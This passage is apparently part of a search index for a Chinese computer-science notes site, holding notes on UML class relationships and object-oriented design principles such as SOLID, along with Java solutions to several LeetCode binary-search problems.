![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6a88a398-c494-41f5-bb62-9f7fb811df7c.jpg" width="280px">
@startuml title Composition class Company
class DepartmentA
class DepartmentB Company *-- DepartmentA
Company *-- DepartmentB @enduml`},{header:"\u5173\u8054\u5173\u7CFB (Association)",slug:"\u5173\u8054\u5173\u7CFB-association",content:`\u8868\u793A\u4E0D\u540C\u7C7B\u5BF9\u8C61\u4E4B\u95F4\u6709\u5173\u8054\uFF0C\u8FD9\u662F\u4E00\u79CD\u9759\u6001\u5173\u7CFB\uFF0C\u4E0E\u8FD0\u884C\u8FC7\u7A0B\u7684\u72B6\u6001\u65E0\u5173\uFF0C\u5728\u6700\u5F00\u59CB\u5C31\u53EF\u4EE5\u786E\u5B9A\u3002\u56E0\u6B64\u4E5F\u53EF\u4EE5\u7528 1 \u5BF9 1\u3001\u591A\u5BF9 1\u3001\u591A\u5BF9\u591A\u8FD9\u79CD\u5173\u8054\u5173\u7CFB\u6765\u8868\u793A\u3002\u6BD4\u5982\u5B66\u751F\u548C\u5B66\u6821\u5C31\u662F\u4E00\u79CD\u5173\u8054\u5173\u7CFB\uFF0C\u4E00\u4E2A\u5B66\u6821\u53EF\u4EE5\u6709\u5F88\u591A\u5B66\u751F\uFF0C\u4F46\u662F\u4E00\u4E2A\u5B66\u751F\u53EA\u5C5E\u4E8E\u4E00\u4E2A\u5B66\u6821\uFF0C\u56E0\u6B64\u8FD9\u662F\u4E00\u79CD\u591A\u5BF9\u4E00\u7684\u5173\u7CFB\uFF0C\u5728\u8FD0\u884C\u5F00\u59CB\u4E4B\u524D\u5C31\u53EF\u4EE5\u786E\u5B9A\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a3e4dc62-0da5-4d22-94f2-140078281812.jpg" width="200px">
@startuml title Association class School
class Student School "1" - "n" Student @enduml`},{header:"\u4F9D\u8D56\u5173\u7CFB (Dependency)",slug:"\u4F9D\u8D56\u5173\u7CFB-dependency",content:`\u548C\u5173\u8054\u5173\u7CFB\u4E0D\u540C\u7684\u662F\uFF0C\u4F9D\u8D56\u5173\u7CFB\u662F\u5728\u8FD0\u884C\u8FC7\u7A0B\u4E2D\u8D77\u4F5C\u7528\u7684\u3002A \u7C7B\u548C B \u7C7B\u662F\u4F9D\u8D56\u5173\u7CFB\u4E3B\u8981\u6709\u4E09\u79CD\u5F62\u5F0F\uFF1A A \u7C7B\u662F B \u7C7B\u65B9\u6CD5\u7684\u5C40\u90E8\u53D8\u91CF\uFF1B
A \u7C7B\u662F B \u7C7B\u65B9\u6CD5\u7684\u53C2\u6570\uFF1B
A \u7C7B\u5411 B \u7C7B\u53D1\u9001\u6D88\u606F\uFF0C\u4ECE\u800C\u5F71\u54CD B \u7C7B\u53D1\u751F\u53D8\u5316\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/379444c9-f1d1-45cd-b7aa-b0c18427d388.jpg" width="330px">
@startuml title Dependency class Vihicle { move(MoveBehavior)
} interface MoveBehavior { move()
} note "MoveBehavior.move()" as N Vihicle ..> MoveBehavior Vihicle .. N @enduml`},{header:"\u4E09\u3001\u8BBE\u8BA1\u539F\u5219",slug:"\u4E09\u3001\u8BBE\u8BA1\u539F\u5219",content:""},{header:"S.O.L.I.D",slug:"s-o-l-i-d",content:`\u7B80\u5199
\u5168\u62FC
\u4E2D\u6587\u7FFB\u8BD1 SRP
The Single Responsibility Principle
\u5355\u4E00\u8D23\u4EFB\u539F\u5219 OCP
The Open Closed Principle
\u5F00\u653E\u5C01\u95ED\u539F\u5219 LSP
The Liskov Substitution Principle
\u91CC\u6C0F\u66FF\u6362\u539F\u5219 ISP
The Interface Segregation Principle
\u63A5\u53E3\u5206\u79BB\u539F\u5219 DIP
The Dependency Inversion Principle
\u4F9D\u8D56\u5012\u7F6E\u539F\u5219`},{header:"1. \u5355\u4E00\u8D23\u4EFB\u539F\u5219",slug:"_1-\u5355\u4E00\u8D23\u4EFB\u539F\u5219",content:`\u4FEE\u6539\u4E00\u4E2A\u7C7B\u7684\u539F\u56E0\u5E94\u8BE5\u53EA\u6709\u4E00\u4E2A\u3002 \u6362\u53E5\u8BDD\u8BF4\u5C31\u662F\u8BA9\u4E00\u4E2A\u7C7B\u53EA\u8D1F\u8D23\u4E00\u4EF6\u4E8B\uFF0C\u5F53\u8FD9\u4E2A\u7C7B\u9700\u8981\u505A\u8FC7\u591A\u4E8B\u60C5\u7684\u65F6\u5019\uFF0C\u5C31\u9700\u8981\u5206\u89E3\u8FD9\u4E2A\u7C7B\u3002
\u5982\u679C\u4E00\u4E2A\u7C7B\u627F\u62C5\u7684\u804C\u8D23\u8FC7\u591A\uFF0C\u5C31\u7B49\u4E8E\u628A\u8FD9\u4E9B\u804C\u8D23\u8026\u5408\u5728\u4E86\u4E00\u8D77\uFF0C\u4E00\u4E2A\u804C\u8D23\u7684\u53D8\u5316\u53EF\u80FD\u4F1A\u524A\u5F31\u8FD9\u4E2A\u7C7B\u5B8C\u6210\u5176\u5B83\u804C\u8D23\u7684\u80FD\u529B\u3002`},{header:"2. \u5F00\u653E\u5C01\u95ED\u539F\u5219",slug:"_2-\u5F00\u653E\u5C01\u95ED\u539F\u5219",content:`\u7C7B\u5E94\u8BE5\u5BF9\u6269\u5C55\u5F00\u653E\uFF0C\u5BF9\u4FEE\u6539\u5173\u95ED\u3002 \u6269\u5C55\u5C31\u662F\u6DFB\u52A0\u65B0\u529F\u80FD\u7684\u610F\u601D\uFF0C\u56E0\u6B64\u8BE5\u539F\u5219\u8981\u6C42\u5728\u6DFB\u52A0\u65B0\u529F\u80FD\u65F6\u4E0D\u9700\u8981\u4FEE\u6539\u4EE3\u7801\u3002
\u7B26\u5408\u5F00\u95ED\u539F\u5219\u6700\u5178\u578B\u7684\u8BBE\u8BA1\u6A21\u5F0F\u662F\u88C5\u9970\u8005\u6A21\u5F0F\uFF0C\u5B83\u53EF\u4EE5\u52A8\u6001\u5730\u5C06\u8D23\u4EFB\u9644\u52A0\u5230\u5BF9\u8C61\u4E0A\uFF0C\u800C\u4E0D\u7528\u53BB\u4FEE\u6539\u7C7B\u7684\u4EE3\u7801\u3002`},{header:"3. \u91CC\u6C0F\u66FF\u6362\u539F\u5219",slug:"_3-\u91CC\u6C0F\u66FF\u6362\u539F\u5219",content:`\u5B50\u7C7B\u5BF9\u8C61\u5FC5\u987B\u80FD\u591F\u66FF\u6362\u6389\u6240\u6709\u7236\u7C7B\u5BF9\u8C61\u3002 \u7EE7\u627F\u662F\u4E00\u79CD IS-A \u5173\u7CFB\uFF0C\u5B50\u7C7B\u9700\u8981\u80FD\u591F\u5F53\u6210\u7236\u7C7B\u6765\u4F7F\u7528\uFF0C\u5E76\u4E14\u9700\u8981\u6BD4\u7236\u7C7B\u66F4\u7279\u6B8A\u3002
\u5982\u679C\u4E0D\u6EE1\u8DB3\u8FD9\u4E2A\u539F\u5219\uFF0C\u90A3\u4E48\u5404\u4E2A\u5B50\u7C7B\u7684\u884C\u4E3A\u4E0A\u5C31\u4F1A\u6709\u5F88\u5927\u5DEE\u5F02\uFF0C\u589E\u52A0\u7EE7\u627F\u4F53\u7CFB\u7684\u590D\u6742\u5EA6\u3002`},{header:"4. \u63A5\u53E3\u5206\u79BB\u539F\u5219",slug:"_4-\u63A5\u53E3\u5206\u79BB\u539F\u5219",content:"\u4E0D\u5E94\u8BE5\u5F3A\u8FEB\u5BA2\u6237\u4F9D\u8D56\u4E8E\u5B83\u4EEC\u4E0D\u7528\u7684\u65B9\u6CD5\u3002 \u56E0\u6B64\u4F7F\u7528\u591A\u4E2A\u4E13\u95E8\u7684\u63A5\u53E3\u6BD4\u4F7F\u7528\u5355\u4E00\u7684\u603B\u63A5\u53E3\u8981\u597D\u3002"},{header:"5. \u4F9D\u8D56\u5012\u7F6E\u539F\u5219",slug:"_5-\u4F9D\u8D56\u5012\u7F6E\u539F\u5219",content:`\u9AD8\u5C42\u6A21\u5757\u4E0D\u5E94\u8BE5\u4F9D\u8D56\u4E8E\u4F4E\u5C42\u6A21\u5757\uFF0C\u4E8C\u8005\u90FD\u5E94\u8BE5\u4F9D\u8D56\u4E8E\u62BD\u8C61\uFF1B
\u62BD\u8C61\u4E0D\u5E94\u8BE5\u4F9D\u8D56\u4E8E\u7EC6\u8282\uFF0C\u7EC6\u8282\u5E94\u8BE5\u4F9D\u8D56\u4E8E\u62BD\u8C61\u3002 \u9AD8\u5C42\u6A21\u5757\u5305\u542B\u4E00\u4E2A\u5E94\u7528\u7A0B\u5E8F\u4E2D\u91CD\u8981\u7684\u7B56\u7565\u9009\u62E9\u548C\u4E1A\u52A1\u6A21\u5757\uFF0C\u5982\u679C\u9AD8\u5C42\u6A21\u5757\u4F9D\u8D56\u4E8E\u4F4E\u5C42\u6A21\u5757\uFF0C\u90A3\u4E48\u4F4E\u5C42\u6A21\u5757\u7684\u6539\u52A8\u5C31\u4F1A\u76F4\u63A5\u5F71\u54CD\u5230\u9AD8\u5C42\u6A21\u5757\uFF0C\u4ECE\u800C\u8FEB\u4F7F\u9AD8\u5C42\u6A21\u5757\u4E5F\u9700\u8981\u6539\u52A8\u3002
\u4F9D\u8D56\u4E8E\u62BD\u8C61\u610F\u5473\u7740\uFF1A \u4EFB\u4F55\u53D8\u91CF\u90FD\u4E0D\u5E94\u8BE5\u6301\u6709\u4E00\u4E2A\u6307\u5411\u5177\u4F53\u7C7B\u7684\u6307\u9488\u6216\u8005\u5F15\u7528\uFF1B
\u4EFB\u4F55\u7C7B\u90FD\u4E0D\u5E94\u8BE5\u4ECE\u5177\u4F53\u7C7B\u6D3E\u751F\uFF1B
\u4EFB\u4F55\u65B9\u6CD5\u90FD\u4E0D\u5E94\u8BE5\u8986\u5199\u5B83\u7684\u4EFB\u4F55\u57FA\u7C7B\u4E2D\u7684\u5DF2\u7ECF\u5B9E\u73B0\u7684\u65B9\u6CD5\u3002`},{header:"\u5176\u4ED6\u5E38\u89C1\u539F\u5219",slug:"\u5176\u4ED6\u5E38\u89C1\u539F\u5219",content:`\u9664\u4E86\u4E0A\u8FF0\u7684\u7ECF\u5178\u539F\u5219\uFF0C\u5728\u5B9E\u9645\u5F00\u53D1\u4E2D\u8FD8\u6709\u4E0B\u9762\u8FD9\u4E9B\u5E38\u89C1\u7684\u8BBE\u8BA1\u539F\u5219\u3002 \u7B80\u5199
\u5168\u62FC
\u4E2D\u6587\u7FFB\u8BD1 LOD
The Law of Demeter
\u8FEA\u7C73\u7279\u6CD5\u5219 CRP
The Composite Reuse Principle
\u5408\u6210\u590D\u7528\u539F\u5219 CCP
The Common Closure Principle
\u5171\u540C\u5C01\u95ED\u539F\u5219 SAP
The Stable Abstractions Principle
\u7A33\u5B9A\u62BD\u8C61\u539F\u5219 SDP
The Stable Dependencies Principle
\u7A33\u5B9A\u4F9D\u8D56\u539F\u5219`},{header:"1. \u8FEA\u7C73\u7279\u6CD5\u5219",slug:"_1-\u8FEA\u7C73\u7279\u6CD5\u5219",content:"\u8FEA\u7C73\u7279\u6CD5\u5219\u53C8\u53EB\u4F5C\u6700\u5C11\u77E5\u8BC6\u539F\u5219\uFF08Least Knowledge Principle\uFF0C\u7B80\u5199 LKP\uFF09\uFF0C\u5C31\u662F\u8BF4\u4E00\u4E2A\u5BF9\u8C61\u5E94\u5F53\u5BF9\u5176\u4ED6\u5BF9\u8C61\u6709\u5C3D\u53EF\u80FD\u5C11\u7684\u4E86\u89E3\uFF0C\u4E0D\u548C\u964C\u751F\u4EBA\u8BF4\u8BDD\u3002"},{header:"2. \u5408\u6210\u590D\u7528\u539F\u5219",slug:"_2-\u5408\u6210\u590D\u7528\u539F\u5219",content:"\u5C3D\u91CF\u4F7F\u7528\u5BF9\u8C61\u7EC4\u5408\uFF0C\u800C\u4E0D\u662F\u901A\u8FC7\u7EE7\u627F\u6765\u8FBE\u5230\u590D\u7528\u7684\u76EE\u7684\u3002"},{header:"3. \u5171\u540C\u5C01\u95ED\u539F\u5219",slug:"_3-\u5171\u540C\u5C01\u95ED\u539F\u5219",content:"\u4E00\u8D77\u4FEE\u6539\u7684\u7C7B\uFF0C\u5E94\u8BE5\u7EC4\u5408\u5728\u4E00\u8D77\uFF08\u540C\u4E00\u4E2A\u5305\u91CC\uFF09\u3002\u5982\u679C\u5FC5\u987B\u4FEE\u6539\u5E94\u7528\u7A0B\u5E8F\u91CC\u7684\u4EE3\u7801\uFF0C\u6211\u4EEC\u5E0C\u671B\u6240\u6709\u7684\u4FEE\u6539\u90FD\u53D1\u751F\u5728\u4E00\u4E2A\u5305\u91CC\uFF08\u4FEE\u6539\u5173\u95ED\uFF09\uFF0C\u800C\u4E0D\u662F\u904D\u5E03\u5728\u5F88\u591A\u5305\u91CC\u3002"},{header:"4. \u7A33\u5B9A\u62BD\u8C61\u539F\u5219",slug:"_4-\u7A33\u5B9A\u62BD\u8C61\u539F\u5219",content:"\u6700\u7A33\u5B9A\u7684\u5305\u5E94\u8BE5\u662F\u6700\u62BD\u8C61\u7684\u5305\uFF0C\u4E0D\u7A33\u5B9A\u7684\u5305\u5E94\u8BE5\u662F\u5177\u4F53\u7684\u5305\uFF0C\u5373\u5305\u7684\u62BD\u8C61\u7A0B\u5EA6\u8DDF\u5B83\u7684\u7A33\u5B9A\u6027\u6210\u6B63\u6BD4\u3002"},{header:"5. \u7A33\u5B9A\u4F9D\u8D56\u539F\u5219",slug:"_5-\u7A33\u5B9A\u4F9D\u8D56\u539F\u5219",content:"\u5305\u4E4B\u95F4\u7684\u4F9D\u8D56\u5173\u7CFB\u90FD\u5E94\u8BE5\u662F\u7A33\u5B9A\u65B9\u5411\u4F9D\u8D56\u7684\uFF0C\u5305\u8981\u4F9D\u8D56\u7684\u5305\u8981\u6BD4\u81EA\u5DF1\u66F4\u5177\u6709\u7A33\u5B9A\u6027\u3002"},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`Java \u7F16\u7A0B\u601D\u60F3
\u654F\u6377\u8F6F\u4EF6\u5F00\u53D1\uFF1A\u539F\u5219\u3001\u6A21\u5F0F\u4E0E\u5B9E\u8DF5
\u9762\u5411\u5BF9\u8C61\u8BBE\u8BA1\u7684 SOLID \u539F\u5219
\u770B\u61C2 UML \u7C7B\u56FE\u548C\u65F6\u5E8F\u56FE
UML \u7CFB\u5217\u2014\u2014\u65F6\u5E8F\u56FE\uFF08\u987A\u5E8F\u56FE\uFF09sequence diagram
\u9762\u5411\u5BF9\u8C61\u7F16\u7A0B\u4E09\u5927\u7279\u6027 ------ \u5C01\u88C5\u3001\u7EE7\u627F\u3001\u591A\u6001`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE.html",title:"Leetcode \u9898\u89E3 - \u4E8C\u5206\u67E5\u627E",pathLocale:"/",contents:[{header:"Leetcode \u9898\u89E3 - \u4E8C\u5206\u67E5\u627E",slug:"leetcode-\u9898\u89E3-\u4E8C\u5206\u67E5\u627E",content:`Leetcode \u9898\u89E3 - \u4E8C\u5206\u67E5\u627E 1. \u6C42\u5F00\u65B9
2. \u5927\u4E8E\u7ED9\u5B9A\u5143\u7D20\u7684\u6700\u5C0F\u5143\u7D20
3. \u6709\u5E8F\u6570\u7EC4\u7684 Single Element
4. \u7B2C\u4E00\u4E2A\u9519\u8BEF\u7684\u7248\u672C
5. \u65CB\u8F6C\u6570\u7EC4\u7684\u6700\u5C0F\u6570\u5B57
6. \u67E5\u627E\u533A\u95F4 \u6B63\u5E38\u5B9E\u73B0
Input : [1,2,3,4,5]
key : 3
return the index : 2
public int binarySearch(int[] nums, int key) { int l = 0, h = nums.length - 1; while (l <= h) { int m = l + (h - l) / 2; if (nums[m] == key) { return m; } else if (nums[m] > key) { h = m - 1; } else { l = m + 1; } } return -1;
}
\u65F6\u95F4\u590D\u6742\u5EA6
\u4E8C\u5206\u67E5\u627E\u4E5F\u79F0\u4E3A\u6298\u534A\u67E5\u627E\uFF0C\u6BCF\u6B21\u90FD\u80FD\u5C06\u67E5\u627E\u533A\u95F4\u51CF\u534A\uFF0C\u8FD9\u79CD\u6298\u534A\u7279\u6027\u7684\u7B97\u6CD5\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(logN)\u3002
m \u8BA1\u7B97
\u6709\u4E24\u79CD\u8BA1\u7B97\u4E2D\u503C m \u7684\u65B9\u5F0F\uFF1A m = (l + h) / 2
m = l + (h - l) / 2 l + h \u53EF\u80FD\u51FA\u73B0\u52A0\u6CD5\u6EA2\u51FA\uFF0C\u4E5F\u5C31\u662F\u8BF4\u52A0\u6CD5\u7684\u7ED3\u679C\u5927\u4E8E\u6574\u578B\u80FD\u591F\u8868\u793A\u7684\u8303\u56F4\u3002\u4F46\u662F l \u548C h \u90FD\u4E3A\u6B63\u6570\uFF0C\u56E0\u6B64 h - l \u4E0D\u4F1A\u51FA\u73B0\u52A0\u6CD5\u6EA2\u51FA\u95EE\u9898\u3002\u6240\u4EE5\uFF0C\u6700\u597D\u4F7F\u7528\u7B2C\u4E8C\u79CD\u8BA1\u7B97\u6CD5\u65B9\u6CD5\u3002
\u672A\u6210\u529F\u67E5\u627E\u7684\u8FD4\u56DE\u503C
\u5FAA\u73AF\u9000\u51FA\u65F6\u5982\u679C\u4ECD\u7136\u6CA1\u6709\u67E5\u627E\u5230 key\uFF0C\u90A3\u4E48\u8868\u793A\u67E5\u627E\u5931\u8D25\u3002\u53EF\u4EE5\u6709\u4E24\u79CD\u8FD4\u56DE\u503C\uFF1A -1\uFF1A\u4EE5\u4E00\u4E2A\u9519\u8BEF\u7801\u8868\u793A\u6CA1\u6709\u67E5\u627E\u5230 key
l\uFF1A\u5C06 key \u63D2\u5165\u5230 nums \u4E2D\u7684\u6B63\u786E\u4F4D\u7F6E \u53D8\u79CD
\u4E8C\u5206\u67E5\u627E\u53EF\u4EE5\u6709\u5F88\u591A\u53D8\u79CD\uFF0C\u5B9E\u73B0\u53D8\u79CD\u8981\u6CE8\u610F\u8FB9\u754C\u503C\u7684\u5224\u65AD\u3002\u4F8B\u5982\u5728\u4E00\u4E2A\u6709\u91CD\u590D\u5143\u7D20\u7684\u6570\u7EC4\u4E2D\u67E5\u627E key \u7684\u6700\u5DE6\u4F4D\u7F6E\u7684\u5B9E\u73B0\u5982\u4E0B\uFF1A
public int binarySearch(int[] nums, int key) { int l = 0, h = nums.length; while (l < h) { int m = l + (h - l) / 2; if (nums[m] >= key) { h = m; } else { l = m + 1; } } return l;
}
\u8BE5\u5B9E\u73B0\u548C\u6B63\u5E38\u5B9E\u73B0\u6709\u4EE5\u4E0B\u4E0D\u540C\uFF1A h \u7684\u8D4B\u503C\u8868\u8FBE\u5F0F\u4E3A h = m
\u5FAA\u73AF\u6761\u4EF6\u4E3A l < h
\u6700\u540E\u8FD4\u56DE l \u800C\u4E0D\u662F -1 \u5728 nums[m] >= key \u7684\u60C5\u51B5\u4E0B\uFF0C\u53EF\u4EE5\u63A8\u5BFC\u51FA\u6700\u5DE6 key \u4F4D\u4E8E [l, m] \u533A\u95F4\u4E2D\uFF0C\u8FD9\u662F\u4E00\u4E2A\u95ED\u533A\u95F4\u3002h \u7684\u8D4B\u503C\u8868\u8FBE\u5F0F\u4E3A h = m\uFF0C\u56E0\u4E3A m \u4F4D\u7F6E\u4E5F\u53EF\u80FD\u662F\u89E3\u3002
\u5728 h \u7684\u8D4B\u503C\u8868\u8FBE\u5F0F\u4E3A h = m \u7684\u60C5\u51B5\u4E0B\uFF0C\u5982\u679C\u5FAA\u73AF\u6761\u4EF6\u4E3A l <= h\uFF0C\u90A3\u4E48\u4F1A\u51FA\u73B0\u5FAA\u73AF\u65E0\u6CD5\u9000\u51FA\u7684\u60C5\u51B5\uFF0C\u56E0\u6B64\u5FAA\u73AF\u6761\u4EF6\u53EA\u80FD\u662F l < h\u3002\u4EE5\u4E0B\u6F14\u793A\u4E86\u5FAA\u73AF\u6761\u4EF6\u4E3A l <= h \u65F6\u5FAA\u73AF\u65E0\u6CD5\u9000\u51FA\u7684\u60C5\u51B5\uFF1A
nums = {0, 1, 2}, key = 1
l m h
0 1 2 nums[m] >= key
0 0 1 nums[m] < key
1 1 1 nums[m] >= key
1 1 1 nums[m] >= key
...
\u5F53\u5FAA\u73AF\u4F53\u9000\u51FA\u65F6\uFF0C\u4E0D\u8868\u793A\u6CA1\u6709\u67E5\u627E\u5230 key\uFF0C\u56E0\u6B64\u6700\u540E\u8FD4\u56DE\u7684\u7ED3\u679C\u4E0D\u5E94\u8BE5\u4E3A -1\u3002\u4E3A\u4E86\u9A8C\u8BC1\u6709\u6CA1\u6709\u67E5\u627E\u5230\uFF0C\u9700\u8981\u5728\u8C03\u7528\u7AEF\u5224\u65AD\u4E00\u4E0B\u8FD4\u56DE\u4F4D\u7F6E\u4E0A\u7684\u503C\u548C key \u662F\u5426\u76F8\u7B49\u3002`},{header:"1. \u6C42\u5F00\u65B9",slug:"_1-\u6C42\u5F00\u65B9",content:`69. Sqrt(x) (Easy)
Leetcode / \u529B\u6263
Input: 4
Output: 2 Input: 8
Output: 2
Explanation: The square root of 8 is 2.82842..., and since we want to return an integer, the decimal part will be truncated.
\u4E00\u4E2A\u6570 x \u7684\u5F00\u65B9 sqrt \u4E00\u5B9A\u5728 0 ~ x \u4E4B\u95F4\uFF0C\u5E76\u4E14\u6EE1\u8DB3 sqrt == x / sqrt\u3002\u53EF\u4EE5\u5229\u7528\u4E8C\u5206\u67E5\u627E\u5728 0 ~ x \u4E4B\u95F4\u67E5\u627E sqrt\u3002
\u5BF9\u4E8E x = 8\uFF0C\u5B83\u7684\u5F00\u65B9\u662F 2.82842...\uFF0C\u6700\u540E\u5E94\u8BE5\u8FD4\u56DE 2 \u800C\u4E0D\u662F 3\u3002\u5728\u5FAA\u73AF\u6761\u4EF6\u4E3A l <= h \u5E76\u4E14\u5FAA\u73AF\u9000\u51FA\u65F6\uFF0Ch \u603B\u662F\u6BD4 l \u5C0F 1\uFF0C\u4E5F\u5C31\u662F\u8BF4 h = 2\uFF0Cl = 3\uFF0C\u56E0\u6B64\u6700\u540E\u7684\u8FD4\u56DE\u503C\u5E94\u8BE5\u4E3A h \u800C\u4E0D\u662F l\u3002
public int mySqrt(int x) { if (x <= 1) { return x; } int l = 1, h = x; while (l <= h) { int mid = l + (h - l) / 2; int sqrt = x / mid; if (sqrt == mid) { return mid; } else if (mid > sqrt) { h = mid - 1; } else { l = mid + 1; } } return h;
}`},{header:"2. \u5927\u4E8E\u7ED9\u5B9A\u5143\u7D20\u7684\u6700\u5C0F\u5143\u7D20",slug:"_2-\u5927\u4E8E\u7ED9\u5B9A\u5143\u7D20\u7684\u6700\u5C0F\u5143\u7D20",content:`744. Find Smallest Letter Greater Than Target (Easy)
Leetcode / \u529B\u6263
Input:
letters = ["c", "f", "j"]
target = "d"
Output: "f" Input:
letters = ["c", "f", "j"]
target = "k"
Output: "c"
\u9898\u76EE\u63CF\u8FF0\uFF1A\u7ED9\u5B9A\u4E00\u4E2A\u6709\u5E8F\u7684\u5B57\u7B26\u6570\u7EC4 letters \u548C\u4E00\u4E2A\u5B57\u7B26 target\uFF0C\u8981\u6C42\u627E\u51FA letters \u4E2D\u5927\u4E8E target \u7684\u6700\u5C0F\u5B57\u7B26\uFF0C\u5982\u679C\u627E\u4E0D\u5230\u5C31\u8FD4\u56DE\u7B2C 1 \u4E2A\u5B57\u7B26\u3002
public char nextGreatestLetter(char[] letters, char target) { int n = letters.length; int l = 0, h = n - 1; while (l <= h) { int m = l + (h - l) / 2; if (letters[m] <= target) { l = m + 1; } else { h = m - 1; } } return l < n ? letters[l] : letters[0];
}`},{header:"3. \u6709\u5E8F\u6570\u7EC4\u7684 Single Element",slug:"_3-\u6709\u5E8F\u6570\u7EC4\u7684-single-element",content:`540. Single Element in a Sorted Array (Medium)
Leetcode / \u529B\u6263
Input: [1, 1, 2, 3, 3, 4, 4, 8, 8]
Output: 2
\u9898\u76EE\u63CF\u8FF0\uFF1A\u4E00\u4E2A\u6709\u5E8F\u6570\u7EC4\u53EA\u6709\u4E00\u4E2A\u6570\u4E0D\u51FA\u73B0\u4E24\u6B21\uFF0C\u627E\u51FA\u8FD9\u4E2A\u6570\u3002
\u8981\u6C42\u4EE5 O(logN) \u65F6\u95F4\u590D\u6742\u5EA6\u8FDB\u884C\u6C42\u89E3\uFF0C\u56E0\u6B64\u4E0D\u80FD\u904D\u5386\u6570\u7EC4\u5E76\u8FDB\u884C\u5F02\u6216\u64CD\u4F5C\u6765\u6C42\u89E3\uFF0C\u8FD9\u4E48\u505A\u7684\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(N)\u3002
\u4EE4 index \u4E3A Single Element \u5728\u6570\u7EC4\u4E2D\u7684\u4F4D\u7F6E\u3002\u5728 index \u4E4B\u540E\uFF0C\u6570\u7EC4\u4E2D\u539F\u6765\u5B58\u5728\u7684\u6210\u5BF9\u72B6\u6001\u88AB\u6539\u53D8\u3002\u5982\u679C m \u4E3A\u5076\u6570\uFF0C\u5E76\u4E14 m + 1 < index\uFF0C\u90A3\u4E48 nums[m] == nums[m + 1]\uFF1Bm + 1 >= index\uFF0C\u90A3\u4E48 nums[m] != nums[m + 1]\u3002
\u4ECE\u4E0A\u9762\u7684\u89C4\u5F8B\u53EF\u4EE5\u77E5\u9053\uFF0C\u5982\u679C nums[m] == nums[m + 1]\uFF0C\u90A3\u4E48 index \u6240\u5728\u7684\u6570\u7EC4\u4F4D\u7F6E\u4E3A [m + 2, h]\uFF0C\u6B64\u65F6\u4EE4 l = m + 2\uFF1B\u5982\u679C nums[m] != nums[m + 1]\uFF0C\u90A3\u4E48 index \u6240\u5728\u7684\u6570\u7EC4\u4F4D\u7F6E\u4E3A [l, m]\uFF0C\u6B64\u65F6\u4EE4 h = m\u3002
\u56E0\u4E3A h \u7684\u8D4B\u503C\u8868\u8FBE\u5F0F\u4E3A h = m\uFF0C\u90A3\u4E48\u5FAA\u73AF\u6761\u4EF6\u4E5F\u5C31\u53EA\u80FD\u4F7F\u7528 l < h \u8FD9\u79CD\u5F62\u5F0F\u3002
public int singleNonDuplicate(int[] nums) { int l = 0, h = nums.length - 1; while (l < h) { int m = l + (h - l) / 2; if (m % 2 == 1) { m--; // \u4FDD\u8BC1 l/h/m \u90FD\u5728\u5076\u6570\u4F4D\uFF0C\u4F7F\u5F97\u67E5\u627E\u533A\u95F4\u5927\u5C0F\u4E00\u76F4\u90FD\u662F\u5947\u6570 } if (nums[m] == nums[m + 1]) { l = m + 2; } else { h = m; } } return nums[l];
}`},{header:"4. \u7B2C\u4E00\u4E2A\u9519\u8BEF\u7684\u7248\u672C",slug:"_4-\u7B2C\u4E00\u4E2A\u9519\u8BEF\u7684\u7248\u672C",content:`278. First Bad Version (Easy)
Leetcode / \u529B\u6263
\u9898\u76EE\u63CF\u8FF0\uFF1A\u7ED9\u5B9A\u4E00\u4E2A\u5143\u7D20 n \u4EE3\u8868\u6709 [1, 2, ..., n] \u7248\u672C\uFF0C\u5728\u7B2C x \u4F4D\u7F6E\u5F00\u59CB\u51FA\u73B0\u9519\u8BEF\u7248\u672C\uFF0C\u5BFC\u81F4\u540E\u9762\u7684\u7248\u672C\u90FD\u9519\u8BEF\u3002\u53EF\u4EE5\u8C03\u7528 isBadVersion(int x) \u77E5\u9053\u67D0\u4E2A\u7248\u672C\u662F\u5426\u9519\u8BEF\uFF0C\u8981\u6C42\u627E\u5230\u7B2C\u4E00\u4E2A\u9519\u8BEF\u7684\u7248\u672C\u3002
\u5982\u679C\u7B2C m \u4E2A\u7248\u672C\u51FA\u9519\uFF0C\u5219\u8868\u793A\u7B2C\u4E00\u4E2A\u9519\u8BEF\u7684\u7248\u672C\u5728 [l, m] \u4E4B\u95F4\uFF0C\u4EE4 h = m\uFF1B\u5426\u5219\u7B2C\u4E00\u4E2A\u9519\u8BEF\u7684\u7248\u672C\u5728 [m + 1, h] \u4E4B\u95F4\uFF0C\u4EE4 l = m + 1\u3002
\u56E0\u4E3A h \u7684\u8D4B\u503C\u8868\u8FBE\u5F0F\u4E3A h = m\uFF0C\u56E0\u6B64\u5FAA\u73AF\u6761\u4EF6\u4E3A l < h\u3002
public int firstBadVersion(int n) { int l = 1, h = n; while (l < h) { int mid = l + (h - l) / 2; if (isBadVersion(mid)) { h = mid; } else { l = mid + 1; } } return l;
}`},{header:"5. \u65CB\u8F6C\u6570\u7EC4\u7684\u6700\u5C0F\u6570\u5B57",slug:"_5-\u65CB\u8F6C\u6570\u7EC4\u7684\u6700\u5C0F\u6570\u5B57",content:`153. Find Minimum in Rotated Sorted Array (Medium)
Leetcode / \u529B\u6263
Input: [3,4,5,1,2],
Output: 1
public int findMin(int[] nums) { int l = 0, h = nums.length - 1; while (l < h) { int m = l + (h - l) / 2; if (nums[m] <= nums[h]) { h = m; } else { l = m + 1; } } return nums[l];
}`},{header:"6. \u67E5\u627E\u533A\u95F4",slug:"_6-\u67E5\u627E\u533A\u95F4",content:`34. Find First and Last Position of Element in Sorted Array
Leetcode / \u529B\u6263
Input: nums = [5,7,7,8,8,10], target = 8
Output: [3,4] Input: nums = [5,7,7,8,8,10], target = 6
Output: [-1,-1]
\u9898\u76EE\u63CF\u8FF0\uFF1A\u7ED9\u5B9A\u4E00\u4E2A\u6709\u5E8F\u6570\u7EC4 nums \u548C\u4E00\u4E2A\u76EE\u6807 target\uFF0C\u8981\u6C42\u627E\u5230 target \u5728 nums \u4E2D\u7684\u7B2C\u4E00\u4E2A\u4F4D\u7F6E\u548C\u6700\u540E\u4E00\u4E2A\u4F4D\u7F6E\u3002
